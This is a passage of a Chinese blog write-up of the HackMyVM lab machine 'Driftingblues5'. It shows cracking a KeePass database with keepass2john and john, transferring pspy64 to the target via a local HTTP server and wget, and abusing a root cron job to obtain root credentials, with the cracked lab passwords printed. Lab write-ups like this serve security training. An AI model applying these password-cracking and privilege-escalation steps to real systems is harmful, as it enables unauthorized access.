+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gill@driftingblues:~$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 4 gill gill 4096 Apr  6 05:45 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Feb 24  2021 ..</span><br><span class="line">drwx------ 3 gill gill 4096 Apr  6 05:45 .gnupg</span><br><span class="line">-rwx------ 1 gill gill 2030 Feb 24  2021 keyfile.kdbx</span><br><span class="line">drwx------ 2 gill gill 4096 Feb 24  2021 .ssh</span><br><span class="line">-r-x------ 1 gill gill   32 Feb 24  2021 user.txt</span><br></pre></td></tr></table></figure></div>
+<p>有意思的是这个.kdbx文件，问一下ai，是一个 KeePass 2.x 版本的密码数据库文件，扩展名为 .kdbx。<br>KeePass 是一款开源的密码管理器，用来安全地保存各种账号密码。它使用**加密算法（如 AES）**来保护用户的数据。<br>这个类型的文件可以用john破解密码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# keepass2john keyfile.kdbx &gt; hash</span><br><span class="line">                                                                                                                                                         </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# john hash -w=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (KeePass [SHA256 AES 32/64])</span><br><span class="line">Cost 1 (iteration count) is 60000 for all loaded hashes</span><br><span class="line">Cost 2 (version) is 2 for all loaded hashes</span><br><span class="line">Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">porsiempre       (keyfile)     </span><br><span class="line">1g 0:00:00:13 DONE (2025-04-06 20:10) 0.07496g/s 518.1p/s 518.1c/s 518.1C/s polly..better</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
+
+<p>得到密码后，安装一个查看keepass的工具</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# apt install keepassxc</span><br></pre></td></tr></table></figure></div>
+<p>输入密码之后得到一些标题<br><img src="https://pic1.imgdb.cn/item/67f26ffb0ba3d5a1d7eed586.png"><br>然后这些也不是root的密码 ，后面的部分就很奇怪，不是正常思路可以想到的<br>先从本地拿一个pspy64看一下定时任务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">192.168.64.174 - - [06/Apr/2025 20:15:24] &quot;GET /pspy64 HTTP/1.1&quot; 200 -</span><br><span class="line"></span><br><span class="line">gill@driftingblues:~$ wget 192.168.64.11/pspy64</span><br><span class="line">--2025-04-06 07:15:22--  http://192.168.64.11/pspy64</span><br><span class="line">Connecting to 192.168.64.11:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3104768 (3.0M) [application/octet-stream]</span><br><span class="line">Saving to: ‘pspy64’</span><br><span class="line"></span><br><span class="line">pspy64                                 100%[=========================================================================&gt;]   2.96M  1.01MB/s    in 2.9s    </span><br><span class="line"></span><br><span class="line">2025-04-06 07:15:27 (1.01 MB/s) - ‘pspy64’ saved [3104768/3104768]</span><br><span class="line"></span><br><span class="line">gill@driftingblues:~$ chmod +x pspy64</span><br></pre></td></tr></table></figure></div>
+<p>运行之后，发现有一个定时任务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2025/04/06 07:16:20 CMD: UID=0     PID=1      | /sbin/init </span><br><span class="line">2025/04/06 07:17:01 CMD: UID=0     PID=696    | /usr/sbin/CRON -f </span><br><span class="line">2025/04/06 07:17:01 CMD: UID=0     PID=695    | /usr/sbin/cron -f </span><br><span class="line">2025/04/06 07:17:01 CMD: UID=0     PID=697    | /usr/sbin/CRON -f </span><br><span class="line">2025/04/06 07:17:01 CMD: UID=0     PID=698    | /usr/sbin/CRON -f </span><br><span class="line">2025/04/06 07:17:01 CMD: UID=0     PID=699    | /bin/sh -c    cd / &amp;&amp; run-parts --report /etc/cron.hourly </span><br><span class="line">2025/04/06 07:17:01 CMD: UID=0     PID=700    | /bin/sh -c /root/key.sh </span><br><span class="line">2025/04/06 07:17:01 CMD: UID=0     PID=701    | /bin/bash /root/key.sh </span><br></pre></td></tr></table></figure></div>
+<p>这里有一个&#x2F;root&#x2F;key.sh 这种脚本一般就是检测文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gill@driftingblues:/$ ls -al</span><br><span class="line">total 69</span><br><span class="line">drwxr-xr-x 19 root root  4096 Feb 24  2021 .</span><br><span class="line">drwxr-xr-x 19 root root  4096 Feb 24  2021 ..</span><br><span class="line">lrwxrwxrwx  1 root root     7 Dec 17  2020 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x  3 root root  4096 Dec 17  2020 boot</span><br><span class="line">drwxr-xr-x 17 root root  3260 Apr  6 07:04 dev</span><br><span class="line">drwxr-xr-x 73 root root  4096 Apr  6 07:04 etc</span><br><span class="line">drwxr-xr-x  3 root root  4096 Feb 24  2021 home</span><br><span class="line">lrwxrwxrwx  1 root root    31 Dec 17  2020 initrd.img -&gt; boot/initrd.img-4.19.0-13-amd64</span><br><span class="line">lrwxrwxrwx  1 root root    31 Dec 17  2020 initrd.img.old -&gt; boot/initrd.img-4.19.0-13-amd64</span><br><span class="line">drwx---rwx  2 root root  4096 Feb 24  2021 keyfolder</span><br><span class="line">lrwxrwxrwx  1 root root     7 Dec 17  2020 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx  1 root root     9 Dec 17  2020 lib32 -&gt; usr/lib32</span><br><span class="line">lrwxrwxrwx  1 root root     9 Dec 17  2020 lib64 -&gt; usr/lib64</span><br><span class="line">lrwxrwxrwx  1 root root    10 Dec 17  2020 libx32 -&gt; usr/libx32</span><br><span class="line">drwx------  2 root root 16384 Dec 17  2020 lost+found</span><br><span class="line">drwxr-xr-x  3 root root  4096 Dec 17  2020 media</span><br><span class="line">drwxr-xr-x  2 root root  4096 Dec 17  2020 mnt</span><br><span class="line">drwxr-xr-x  2 root root  4096 Dec 17  2020 opt</span><br><span class="line">dr-xr-xr-x 88 root root     0 Apr  6 07:04 proc</span><br><span class="line">drwx------  2 root root  4096 Feb 24  2021 root</span><br><span class="line">drwxr-xr-x 18 root root   540 Apr  6 07:14 run</span><br><span class="line">lrwxrwxrwx  1 root root     8 Dec 17  2020 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x  2 root root  4096 Dec 17  2020 srv</span><br><span class="line">dr-xr-xr-x 13 root root     0 Apr  6 07:04 sys</span><br><span class="line">drwxrwxrwt  9 root root  1024 Apr  6 07:09 tmp</span><br><span class="line">drwxr-xr-x 13 root root  4096 Dec 17  2020 usr</span><br><span class="line">drwxr-xr-x 13 root root  4096 Dec 17  2020 var</span><br><span class="line">lrwxrwxrwx  1 root root    28 Dec 17  2020 vmlinuz -&gt; boot/vmlinuz-4.19.0-13-amd64</span><br><span class="line">lrwxrwxrwx  1 root root    28 Dec 17  2020 vmlinuz.old -&gt; boot/vmlinuz-4.19.0-13-amd64</span><br></pre></td></tr></table></figure></div>
+<p>到根目录下面，发现有一个keyfolder目录，下一步就是在这个目录里面创建文件，文件名就是keepass里面的标题，从后往前创建，这样能更快的找到<br>创建文件之后在用pspy64，看执行检测定时任务之后有没有什么变化<br>但是这里还有一个坑，上次的文件要删除，就是这个文件夹只能有一个文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">gill@driftingblues:/keyfolder$ ls</span><br><span class="line">fracturedocean</span><br><span class="line">gill@driftingblues:/keyfolder$ /home/gill/pspy64</span><br><span class="line">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ </span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ </span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line">done</span><br><span class="line">2025/04/06 07:24:20 CMD: UID=1000  PID=783    | /home/gill/pspy64 </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=725    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=702    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=1000  PID=675    | -bash </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=1000  PID=674    | sshd: gill@pts/0     </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=1000  PID=661    | (sd-pam) </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=1000  PID=660    | /lib/systemd/systemd --user </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=657    | sshd: gill [priv]    </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=656    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=33    PID=484    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=33    PID=483    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=33    PID=482    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=33    PID=481    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=33    PID=480    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=477    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=106   PID=476    | /usr/sbin/mysqld </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=417    | /usr/sbin/sshd -D </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=409    | /sbin/agetty -o -p -- \u --noclear tty1 linux </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=388    | /lib/systemd/systemd-logind </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=384    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=104   PID=383    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=382    | /usr/sbin/rsyslogd -n -iNONE </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=381    | /usr/sbin/cron -f </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=101   PID=356    | /lib/systemd/systemd-timesyncd </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=348    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=347    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=345    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=344    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=339    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=337    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=281    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=280    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=235    | /lib/systemd/systemd-udevd </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=220    | /lib/systemd/systemd-journald </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=187    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=186    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=184    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=153    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=116    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=114    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=113    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=111    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=110    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=109    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=108    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=106    | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=59     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=50     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=49     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=48     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=30     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=29     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=28     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=27     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=26     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=25     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=24     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=23     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=22     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=21     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=20     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=19     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=18     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=17     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=16     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=15     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=14     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=13     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=12     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=11     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=10     | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=9      | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=8      | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=6      | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=4      | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=3      | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=2      | </span><br><span class="line">2025/04/06 07:24:20 CMD: UID=0     PID=1      | /sbin/init </span><br><span class="line">2025/04/06 07:25:01 CMD: UID=0     PID=790    | /usr/sbin/CRON -f </span><br><span class="line">2025/04/06 07:25:01 CMD: UID=0     PID=791    | /usr/sbin/CRON -f </span><br><span class="line">2025/04/06 07:25:01 CMD: UID=0     PID=792    | /bin/sh -c /root/key.sh </span><br><span class="line">2025/04/06 07:25:01 CMD: UID=0     PID=793    | /bin/bash /root/key.sh </span><br><span class="line">2025/04/06 07:25:03 CMD: UID=0     PID=794    | </span><br><span class="line">^CExiting program... (interrupt)</span><br><span class="line">gill@driftingblues:/keyfolder$ ls</span><br><span class="line">fracturedocean	rootcreds.txt</span><br><span class="line">gill@driftingblues:/keyfolder$ cat rootcreds.txt </span><br><span class="line">root creds</span><br><span class="line"></span><br><span class="line">imjustdrifting31</span><br></pre></td></tr></table></figure></div>
+<p>倒数第二个文件是符合条件的，运行那个定时任务之后，在这个文件夹会出现一个新文件，里面是root的密码</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机的提权后面的部分太跳脱了，一般思路根本想不到，不看wp感觉我永远想不到要在这个文件夹里面创建文件，而且还要只能存在一个文件</p>
+<ul>
+<li>wpscan 得到用户名</li>
+<li>学习cewl字典工具，学习这个工具的常用参数，在外国靶机上常用</li>
+<li>有明显不同的图片看看其中有没有多余的信息</li>
+<li>知道.kdbx文件类型  可以用keepass2john破解 用keepassxc工具打开</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/57479.html" title="HMV-Driftingblues5">https://guayu-kakeru.github.io/posts/57479.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/36480.html" rel="prev" title="HMV-Newbee">
+      <i class="fa fa-chevron-left"></i> HMV-Newbee
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/57479.html" title="posts&#x2F;57479.html">HMV-Driftingblues5</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/36480.html" title="posts&#x2F;36480.html">HMV-Newbee</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/46850.html" title="posts&#x2F;46850.html">HMV-Chromee WP复现及复盘</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/37991.html" title="posts&#x2F;37991.html">NSSRound#28web方向wp</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62478.html" title="posts&#x2F;62478.html">HMV-easypwn WP复现与复盘</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
